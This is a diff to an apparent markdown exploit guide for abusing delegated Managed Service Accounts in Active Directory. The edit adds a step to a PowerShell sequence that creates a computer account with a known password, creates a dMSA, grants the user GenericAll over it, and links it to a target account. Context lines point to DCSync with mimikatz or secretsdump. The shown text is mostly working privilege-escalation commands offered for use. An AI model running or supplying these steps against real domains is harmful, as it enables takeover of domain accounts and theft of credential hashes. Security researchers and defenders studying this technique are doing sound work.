@@ -26,7 +26,7 @@ Below are three different ways to exploit this vulnerability.
 
 This method uses an existing domain user account that has permission to create dMSAs in an OU. 
 
-### Setup (via Evil-WinRM / PowerShell)
+### Setup
 
 ```powershell
 # 1. Create the dMSA
@@ -71,21 +71,24 @@ You can later use that ticket to perform DCSync with mimikatz or secretsdump.py
 
 You also use a newly created computer account to request the dMSA TGT. This is possible when `MachineAccountQuota > 0`.
 
-### Setup (via Evil-WinRM / PowerShell)
+### Setup
 
 ```powershell
 # 1. Create a fake computer account with a known password
 New-ADComputer -Name "BADPC" -Path "OU=<OU>,DC=<DC>,DC=<TLD>" -PassThru |
     Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force)
 
-# 2. Give your user GenericAll over the dMSA (badpcDMSA created alongside the computer)
+# 2.
+New-ADServiceAccount -Name badpcDMSA -DNSHostName badpcDMSA.DOMAIN -CreateDelegatedServiceAccount -KerberosEncryptionType AES256 -PrincipalsAllowedToRetrieveManagedPassword "BADPC$" -Path "OU=<OU>,DC=<DC>,DC=<TLD>" -Verbose
+
+# 3. Give your user GenericAll over the dMSA (badpcDMSA created alongside the computer)
 $sid = (Get-ADUser -Identity "<YOUR_USER>").SID
 $acl = Get-Acl "AD:\CN=badpcDMSA,OU=<OU>,DC=<DC>,DC=<TLD>"
 $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
 $acl.AddAccessRule($rule)
 Set-Acl -Path "AD:\CN=badpcDMSA,OU=<OU>,DC=<DC>,DC=<TLD>" -AclObject $acl -Verbose
 
-# 3. Point the dMSA at your target account
+# 4. Point the dMSA at your target account
 Set-ADServiceAccount -Identity badpcDMSA -Replace @{
     'msDS-ManagedAccountPrecededByLink' = 'CN=<TARGET_USER>,CN=Users,DC=<DC>,DC=<TLD>'
     'msDS-DelegatedMSAState'            = 2
